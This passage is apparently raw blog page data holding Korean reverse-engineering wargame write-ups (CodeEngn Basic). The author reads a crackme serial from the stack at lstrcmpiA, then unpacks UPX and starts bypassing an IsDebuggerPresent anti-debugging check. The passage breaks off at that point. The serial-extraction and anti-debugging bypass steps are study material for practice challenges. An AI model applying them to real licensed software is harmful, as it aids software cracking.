background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/40f86a05510540190a270a677f7a42e3/c9b55/4.webp 165w,\n/static/40f86a05510540190a270a677f7a42e3/f2908/4.webp 330w,\n/static/40f86a05510540190a270a677f7a42e3/4b5c0/4.webp 359w\"\n              sizes=\"(max-width: 359px) 100vw, 359px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/40f86a05510540190a270a677f7a42e3/04c57/4.png 165w,\n/static/40f86a05510540190a270a677f7a42e3/d9ecf/4.png 330w,\n/static/40f86a05510540190a270a677f7a42e3/f5eb6/4.png 359w\"\n            sizes=\"(max-width: 359px) 100vw, 359px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/40f86a05510540190a270a677f7a42e3/f5eb6/4.png\"\n            alt=\"stack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 383px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.57575757575758%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABBUlEQVR42pXQUW+DIBQFYBQEFauiwAXhUqutLunLsnXb//9nS9PscV32PZ37cJKTSxDDus7X654wsKIQoiwY45xXdyV5LmHct/Pnx/u6zGpQYKFtW611ShiCz7PsWTkirpdlfdkCBvJfR2M2Kb+UWqTU1irVy6aZwtR1h6aRfa8ozX8tBwez1W/bnsBwIQTnBS/quhb8rixLSmmWZ4wxSilj9BEeyBT9tp9fb7f1svrJgdVd10aMMUyYYsQ4H1PCiBi1Hh3AFLwx1oE9HBqiR4XBL6fT5CwAGD3IpnHeaz0O42DM6MCCc2UpHkuzH/djrCogJBLi86yWtVK9GQewppb1nw/7BphnFtLqwVWKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e3ad6abf5c639e3a1873c7377e3c82b7/c9b55/5.webp 165w,\n/static/e3ad6abf5c639e3a1873c7377e3c82b7/f2908/5.webp 330w,\n/static/e3ad6abf5c639e3a1873c7377e3c82b7/8c481/5.webp 383w\"\n              sizes=\"(max-width: 383px) 100vw, 383px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e3ad6abf5c639e3a1873c7377e3c82b7/04c57/5.png 165w,\n/static/e3ad6abf5c639e3a1873c7377e3c82b7/d9ecf/5.png 330w,\n/static/e3ad6abf5c639e3a1873c7377e3c82b7/d0c94/5.png 383w\"\n            sizes=\"(max-width: 383px) 100vw, 383px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e3ad6abf5c639e3a1873c7377e3c82b7/d0c94/5.png\"\n            alt=\"reg\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>lstrcmpiA 함수에 진입하기 직전의 스택과 레지스터 상태이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.393939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAuklEQVR42l3NvQ6CMBRA4Xsl0tpgaAQURAgxag34MzkYoWo01IC78Cg6+OxGJvSbznbg+XxVdV2WhZTyfLkmeb477LfrlZQyy7I0zaQ8nhr3e5mr/PalyqJQSoHvj13PCwMfAAghsRBJHEdByBgzDINzk+g6ACCi3sSPpViMJxMh5t5oyLjpPqrRJhpMTW5xzrnj2Iz1EFHTNEopInZaIIrCgWU5Q5t2ux2jT99vcxZA82o/EJEQ8nf+AJovGbAzwkR3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fe6c380b8ddfb938f3c3db33fef44462/c9b55/6.webp 165w,\n/static/fe6c380b8ddfb938f3c3db33fef44462/f2908/6.webp 330w,\n/static/fe6c380b8ddfb938f3c3db33fef44462/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fe6c380b8ddfb938f3c3db33fef44462/04c57/6.png 165w,\n/static/fe6c380b8ddfb938f3c3db33fef44462/d9ecf/6.png 330w,\n/static/fe6c380b8ddfb938f3c3db33fef44462/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fe6c380b8ddfb938f3c3db33fef44462/32056/6.png\"\n            alt=\"function\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>함수의 내용은 짧다. [EBP+0C]에는 “06162370056B6AC0”이 들어 있고 [EBP+8]에는 “123”이 들어 있다. [EBP+0C]에 들어있는 값이 시리얼 값으로 추정되어 프로그램을 재실행시켜 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 264px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 138.1818181818182%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAcCAIAAADuuAg3AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAFAElEQVR42p2TaWwUZRjHR6MmJMZoC7IRKy0otSkBBSx48YFEDH7SL373iDHG+E08EOSyihwqRopAQooFWiC9bKGUNtvudrrtHt1jZnZ3rp2Z3ZntHjOzx5y7nZk1u1vwiyTEX948x/vmn+fJ8+YBvr6N/o2niqKQ4oVkKp3KZNMZPs0LWUEoKqqiabKqKboua1pRURRdV0slSVFyhUJRkoBOOw1yUqVS1lV5SVMMXTFUxdBUs6RbllWxrIppVOpY1rI3zYphaLoODDqDBwcXDgx5j9wKdE5AP00hx8Ho0WnoiBPqdMHfTXl+9CL7HJ69dtd+l2+/y3vYGzzsDX4Fem9FceCDrskV+5yrO8HHD9uf/sXVdM7Xei3adCWwth/aOBVbdye8NcCtnwm3zMLtcKw1hG8h2NeY9Bpf5BiMAp+etzfum279eW79ybnmU6628/5t19COIWzrCPqWO/0OLO5GMu8l5Pez2ttMdk9S2JMS3xWKO6jkKQgFPu6aePjz0Sf3jjcesDef9LR2BTZ2Ix39xJZBbMtNfONoZNME2nYH2uYmm8c9LfaFNjfyPLiwasp7AooCH3ZNPPTZaNMh8KlvJ1YedGw47W8/D718NdoxQLR0e9b2uNdcdjV221dfc6664Wjon24YnG4ctj82NHksgAAfnZ189Iux9UfnnvneaTvkXHfC194V2nQR3n6d2NwXbusNNfd4bJdmbFfB1ddB2wBoG5ldOWh/5PrtY34Y+OTC9Iovp5oOzjx3ZH7tD551x/0vnA61/Qlt/gtr74ls6Ak9e9Fj6563XXGv6p1dM+xp6AefuDEJ9I11+iDgm975bb8jO89Ar/8RevMMtPNseOeFyK5L0V2Xo7v6sDeuwq/2hl7pW+joD2wfCe4YC750y/PioMN2Y+K3AAL4ghGXP4yQbDgW90dibgiDcAZnM3Q6R6cFKiVQaZHKiHRGpLPVQ2UFMsOTWT7GskAohPg8bpqi2Tiz4HHPOByuWRdD0yVN1RRZU2RFku6eYj1QJUmTZa4qDgZBcBYnGQLHQHAuEAx5PV7HtPP22Pj4ncmZ2bkEy+XyOV4QBFEUxJwg5nhR5EWRZhiAYRiGZiiKIgkChmEkHMYxHI2iCIzACBKNRmmG4TgumUyyLBuPMzTNJBIJlmVpmgZIkqRpGpxxDvQPuD0+juMoimLicTQaGRocHh+fwAmSqsHE46FgYHTkJgwjDMMQBAEQBBGrQpEkSZBkPSWqniBrKVmj2lqNWCxWt1VxMsllMplCoWCapvFgmKYpy3KhUABkWTZMs2wY5vK2PhCWZZVKJUDTtHpyzz4g5XJ5WbyY15GkUqlYiqrqpZKu64qs6JpWKpVUVVUVuVQu/4dY1zXDNDt+RRsOhKcxMcNSOB6jmZjfDzEximVZDMNCgYAg5k3TMgzjXoM1saZZlrX7HNHSGfazSj6djKAYwzDV+WNkNBxeXEyGkQiGohzHoSjGsqxaa/bftiWtnCrolUrFMIzy0lK5XF5aWjIM466tB+ZS7Wm5cnVgqvp/B1YCeJ6XZVkqFqX7U6ihKEr9e/P5giRJuVwOyGQy+Xw+dx/y+XwqlaIoiqYph8Mx73ZTFE1R1OLiIs/zQDablSWpWEOSavWLd9OiJEsyz/PxeDyRSIDgjMs1x9RIp9PVygRB1DemSqK6K4lEgqtRv6MoCsdxgiDY2k11CWm6HvwDwDZejaYlL4IAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/13a5de048a21ebd86708edb13a6403f1/c9b55/7.webp 165w,\n/static/13a5de048a21ebd86708edb13a6403f1/9a0f6/7.webp 264w\"\n              sizes=\"(max-width: 264px) 100vw, 264px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/13a5de048a21ebd86708edb13a6403f1/04c57/7.png 165w,\n/static/13a5de048a21ebd86708edb13a6403f1/e61aa/7.png 264w\"\n            sizes=\"(max-width: 264px) 100vw, 264px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/13a5de048a21ebd86708edb13a6403f1/e61aa/7.png\"\n            alt=\"G0od\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 값이 맞음을 확인하였다.</p>\n<p>정답: 06162370056B6AC0</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"e5a8ea59-799f-5954-be74-fa8ee898bb64","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-18/","title":"CodeEngn Basic 18","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/eeb600d85c724b40e8a3c1424850790d/cd753/0.png","srcSet":"/static/eeb600d85c724b40e8a3c1424850790d/cec7e/0.png 59w,\n/static/eeb600d85c724b40e8a3c1424850790d/9d378/0.png 118w,\n/static/eeb600d85c724b40e8a3c1424850790d/cd753/0.png 235w","sizes":"(min-width: 235px) 235px, 100vw"},"sources":[{"srcSet":"/static/eeb600d85c724b40e8a3c1424850790d/4f211/0.webp 59w,\n/static/eeb600d85c724b40e8a3c1424850790d/f7248/0.webp 118w,\n/static/eeb600d85c724b40e8a3c1424850790d/6a9cd/0.webp 235w","type":"image/webp","sizes":"(min-width: 235px) 235px, 100vw"}]},"width":660,"height":398.8085106382979}}}},"body":"<p>이 프로그램은 몇 밀리세컨드 후에 종료 되는가</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 235px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB0ElEQVR42p2O3W/SUBjG+9/pHLjo4jYGLWVGKUT9p7w0Xho1c8arxUTDApRBv97T9vScUyic9nRiItDWAMYE3YXxlydvnid5v6TK8ZFaV5pPzlS5JldPG3XlrK6oiiyfnhw/OlSVWunenf29PyVXKw8OylK1ctJuac/bWltrvnjWUhW5rTVbWvPp40a1cqTUqvfLe+XSjkr7dxuqfPjwQLoe6AiBbVsAtmPbCIHjrA0AuK7rIvB/4W20Nhiv63A4kIQQRVHkeV78M9tmIYQUcz6NItt2LNP0XZ/ScBwy7OMwZFE0Y5QwxjD2CaGTcQgIMRZuVyRJIiVxHEUTwzBtyzJHBiCPUUICyigJCEUAOCAIwWhkYN8zDDNk4+3w+vJ/vJ39fptznmXZYrFY3s6iyJZFtsxXi2K1zFcbny2LIuecSxjjNE3jOE7+QiTJlMcm4UYws1kCk9Si6zgKZtNYBAGWsO8LITjn8S6cx/M0uULRpy7SHfLm4+XL128vPnd7pnfega47HVMsUUrn83mapje7pOnNj+/fdBxf9HDHph++XL96f3n+1ehY5N2VPwiS2ZhJer/veR4AoNtwAPUN6I4c3XKHgHXL7W0iuJ6u938CP89PT4RN3BMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/eeb600d85c724b40e8a3c1424850790d/c9b55/0.webp 165w,\n/static/eeb600d85c724b40e8a3c1424850790d/e572b/0.webp 235w\"\n              sizes=\"(max-width: 235px) 100vw, 235px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/eeb600d85c724b40e8a3c1424850790d/04c57/0.png 165w,\n/static/eeb600d85c724b40e8a3c1424850790d/6783b/0.png 235w\"\n            sizes=\"(max-width: 235px) 100vw, 235px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/eeb600d85c724b40e8a3c1424850790d/6783b/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음과 같은 창이 뜨는 프로그램이다. 확인 버튼을 눌러도 종료되지만, 방치해 두어도 수 초 뒤에 저절로 종료되는 것을 볼 수 있었다. 이 프로그램을 PEiD로 분석해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB/ElEQVR42k2O2W6bQBSGeczWwSRppaqqKveqD9DXSoUXEjvFkTNglsHAwMwwS8w2Q1HuK9It38XRp//oLMaHr98Wi8Xi08cvi89Xl+b8YmaZM2v+Us3Z/OLtb7HM2bsryzJn19bcnL15f315ZZmGc7sFAKxX6816vVwul7btbDar1drZbJa2vdvuHMdZL1eOc2vb9mZqrbZ3d4fD4fvNjcEYH4ZBSimEkFJyxhmrCKGcC0qrKRGCcz4JZ5xzQqiU8nw+B8fAyPM8z3LGOCUkiSHGWGs9/vxPxXhRIMY5pZRxPo6jUqppWghjI47h0T+mWY5y9LDfQ5hordUrMCZhGGbZdCVJkorSuq6fns4eAEaaZlmalRgXqEggxIR0XaeU0n+hlEEIyxKjHPm+HwQBF6I+n33fn4bzLMcYU1qpvn9+ftZaD6/AJYYQ4hITQtLTqSyxHoamqcMgMKSUSqmu67TWfd83bdu1E13bNk3Tvnwx0fdKqXEch2Ho+34YhqJARhRGURTHUVSWZQJhluUFQmmanpKT5/lpmgLghWHoAUAIbbtu2ti2WmuEkJGl6eHwGAQBpRQh5AEPPAJMiJTCdd0wjIQQTV0DAOI4EUK0bRdHEcYEQmjsXXe32/64v9/vHyilRVEUCFFC/nhRMFb986qqyrJ0Xdf3/d12+wuaTB974NK4FAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/26aa27708129587dbf0b4c0056857709/c9b55/1.webp 165w,\n/static/26aa27708129587dbf0b4c0056857709/f2908/1.webp 330w,\n/static/26aa27708129587dbf0b4c0056857709/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/26aa27708129587dbf0b4c0056857709/04c57/1.png 165w,\n/static/26aa27708129587dbf0b4c0056857709/d9ecf/1.png 330w,\n/static/26aa27708129587dbf0b4c0056857709/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/26aa27708129587dbf0b4c0056857709/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>UPX로 패킹되어 있었다. 패킹을 풀어주도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 592px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABKElEQVR42lXOTW+CQBSF4QvcURnnAoN8VBhQakxKN7KtsfKlTZMW29R050Kr//83NLpqn8WbnN2B1/f9rnv73HUfXbdpqrap6nJdlc91dW1Tl5umrstlWz+tV8tqvdq29cu23TTV9/4LHNt2bEcIklL6fpDnebEo8of88aZYFJN0IgRKqQ0GjIg8z3elCwCHwwEsyxZEiGiRxTkfj6M0SaR041jdhWEQhK6URBZjfRKWbTu9Xk/XdQA4nU7AkI1Go8D3Pc+zrzecMAj7/UE2zYZ8eJsBoqFrV6CBpmmICADn8w9I6XqeR4JM0xRCIDLOOSKSIMaYYaBpmvCfYRgAcLlcYD6fZ9Pp7H6WZVkURYlKVBxHUaRipeI4TdNEKSEE/4OIAOB4PP4CEDEnBQRvaOwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e3627937768be23e055cd23cd1d0fd28/c9b55/2.webp 165w,\n/static/e3627937768be23e055cd23cd1d0fd28/f2908/2.webp 330w,\n/static/e3627937768be23e055cd23cd1d0fd28/0be55/2.webp 592w\"\n              sizes=\"(max-width: 592px) 100vw, 592px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e3627937768be23e055cd23cd1d0fd28/04c57/2.png 165w,\n/static/e3627937768be23e055cd23cd1d0fd28/d9ecf/2.png 330w,\n/static/e3627937768be23e055cd23cd1d0fd28/1b853/2.png 592w\"\n            sizes=\"(max-width: 592px) 100vw, 592px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e3627937768be23e055cd23cd1d0fd28/1b853/2.png\"\n            alt=\"unpack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>패킹을 풀고 올리디버거로 열었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 591px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 72.72727272727273%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACyElEQVR42k3Ry27bRhSAYVaSRdqpZd0oUSI5Q845cx+SFi1RbrroCxRogKI2EqBogyDNqg1QpIsunFiJhFwKP0EL9FUL2TFQYBaz+fCfmeP9/c+/73Yfrq6u323fb97urje7zdvd7WV7f3ZvrrdvNtuPn262u/dXV9cfPt58+uvm9euNlyRj4AR5SslkNO71+0eEhOPx8Sg8ns/7hI6Gw8NWu0WzmdJZWSJJQuRJnIw9z/M4/qrtK2NfsfzFZPJ0HD4FeJHEz+bzX6Lo+XHvuR/81Ok8BnxZlH80zZ/WvZTydyF+Ozy89Bh7pMylto+r6kcG3xP63ar5WakLIS6MeRKG3/r+N53O14gX1j05P39WFJdCXHDxQxA89BDn2oKxWNcaeZpls/V5IQQxltW1Wn/lsmzaan0BkBaOO4dZFmnNKI32YwOAtk4bw4BNplEYTgAxjuMkIVnOUkK73W67fSC4NMYVRYkctbFxHO8xpURba4xBZNNoGoYhIKRpkiRxksSEpP1B3/d95LyqyqZZSimVVnlO77GxxhrG8jAMR6NhzvLJdDKP45SkJye9ru93u93boGqapVISABCh3Wp5wHJtrbZmsaiQA6GkWa8ER1sUZ8uz4XDgeV4QBIwx6+xyWSMwIWSWkbs352pftqenFQCjGTl/uHbWCCmLskQOWZYxBsaaonBNs9RaAWBRuk6nfYfNZ4xAb8tSCqWV1uqk1wsC/+joSAhRVuViUXEOWuuc5fsy4v63jTV3mNB0tToTgiujC2dns+jgoNNutxHBFUVVlYzlWhtK78Zm/ysDu8copDRGz6LoywcPgiCAfcPU9SkCk0qlafIZa2Otc3W94BwpJev1SmsllHaFc85meR7HsRDcWrNqlpyDFDLPsz1OSQqIyLnWKt3vN65OS0RAzo3RlJLBYNAf9AFACF7XFSImSSqk6B50/gP7n5PkCVuJwwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/510134c286bbf40bccfa5ed1a8d85e58/c9b55/3.webp 165w,\n/static/510134c286bbf40bccfa5ed1a8d85e58/f2908/3.webp 330w,\n/static/510134c286bbf40bccfa5ed1a8d85e58/48c21/3.webp 591w\"\n              sizes=\"(max-width: 591px) 100vw, 591px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/510134c286bbf40bccfa5ed1a8d85e58/04c57/3.png 165w,\n/static/510134c286bbf40bccfa5ed1a8d85e58/d9ecf/3.png 330w,\n/static/510134c286bbf40bccfa5ed1a8d85e58/e4c9a/3.png 591w\"\n            sizes=\"(max-width: 591px) 100vw, 591px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/510134c286bbf40bccfa5ed1a8d85e58/e4c9a/3.png\"\n            alt=\"func\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>내부 함수들만 모아 보았다. Sleep, timeGetTime, SetTimer 등의 시간과 관련된 듯 한 함수들이 보인다. DestroyWindow 함수도 찾을 수 있었다. timeGetTime 함수는 Sleep함수 호출 시 몇 밀리세컨드만큼 중지할 것인지를 리턴하는 함수라고 한다. 이 함수들에 중단점을 걸고 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 433px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABGUlEQVR42n2PQUvDQBBG8zO1aRsUEX+Vpx71oCD0qCiIRWipIlob0k262Z2sZHenTYoxzUjSVrzo4/HxZm/reN225+577l637e5s7Wy6s12v43Y3tluHB97J8ZEjhND5Ks0ya421FrG2DvuzBhFNjdZaG6PTNEXE6fTdWVVVcXaaX/akNiBEzPl04kdRGARMCjGPOADMgiCOhVJKCAFJImNJREopJy/X+UVv2T8Hg+EsZCwMGeOc8zlPAJRSMY/nUfRZFGVZftWURVEQESTg5FlGROtqCxFttgmiqjmb/fVeBwA4SqkF1t/Ev7GIywXKDzP2xWA8uR+9vrDk6c13GGMAIP9FSJmA9EN+PZz0bx+vbgZ3Y/9h+PwN9BBhR0lFTp8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/18934354d0f230299fcd2636dcca2ae8/c9b55/4.webp 165w,\n/static/18934354d0f230299fcd2636dcca2ae8/f2908/4.webp 330w,\n/static/18934354d0f230299fcd2636dcca2ae8/aff3a/4.webp 433w\"\n              sizes=\"(max-width: 433px) 100vw, 433px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/18934354d0f230299fcd2636dcca2ae8/04c57/4.png 165w,\n/static/18934354d0f230299fcd2636dcca2ae8/d9ecf/4.png 330w,\n/static/18934354d0f230299fcd2636dcca2ae8/55fc0/4.png 433w\"\n            sizes=\"(max-width: 433px) 100vw, 433px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/18934354d0f230299fcd2636dcca2ae8/55fc0/4.png\"\n            alt=\"warning\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음과 같은 경고창이 뜨며 실행을 계속할 수 없었다. 디버거 안에서 실행시키지 않을 때에는 다음과 같은 현상이 없으므로 안티디버깅 기법이 걸려 있다고 판단했다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.2727272727272725%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAARUlEQVR42mNQVslSV8vR0CrUNyjX0SmWl88yMio3M6tSUcnX1SvW0y/T0y8VFEiWkEgzMS4zMSm3sq7RUC8wMioVF08CAM2kD1Hux86DAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ae2f5a671d288197ee6e7a8e941b85c4/c9b55/5.webp 165w,\n/static/ae2f5a671d288197ee6e7a8e941b85c4/f2908/5.webp 330w,\n/static/ae2f5a671d288197ee6e7a8e941b85c4/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ae2f5a671d288197ee6e7a8e941b85c4/04c57/5.png 165w,\n/static/ae2f5a671d288197ee6e7a8e941b85c4/d9ecf/5.png 330w,\n/static/ae2f5a671d288197ee6e7a8e941b85c4/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ae2f5a671d288197ee6e7a8e941b85c4/32056/5.png\"\n            alt=\"IsDebuggerPresent\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음과 같은 함수가 있음을 발견했다. 이 함수가 있는 곳에 중단점을 걸고 실행시켰더니 아까와 같은 경고창이 뜨지 않았다. 이제 이 함수를 우회하도록 하겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 579px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqElEQVR42lXLMQ6CMBQAUCJtae2HUhCsUBONgaA4gIOasrIQwcQYr+Du5g0cvLTRzbc/qwnlJVvtyzIviqquq3KTHo7s9Q4LhSYj5GCMMKUO/kLEIYQQhDBjTGtt3QGeM3Vtmu489P2pa1tzG/Trke/WOkvGnDPGpPSBc9d1fSmFEAAQR5ExxvJUvNiW0yQJgkDPUw88oZlqQWjhL8XvAABQ6lj/bNv+ABTzEuR52QfPAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/dfcb24e7c85631b215f1573e10f82553/c9b55/6.webp 165w,\n/static/dfcb24e7c85631b215f1573e10f82553/f2908/6.webp 330w,\n/static/dfcb24e7c85631b215f1573e10f82553/0c108/6.webp 579w\"\n              sizes=\"(max-width: 579px) 100vw, 579px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/dfcb24e7c85631b215f1573e10f82553/04c57/6.png 165w,\n/static/dfcb24e7c85631b215f1573e10f82553/d9ecf/6.png 330w,\n/static/dfcb24e7c85631b215f1573e10f82553/c08bc/6.png 579w\"\n            sizes=\"(max-width: 579px) 100vw, 579px\"\n            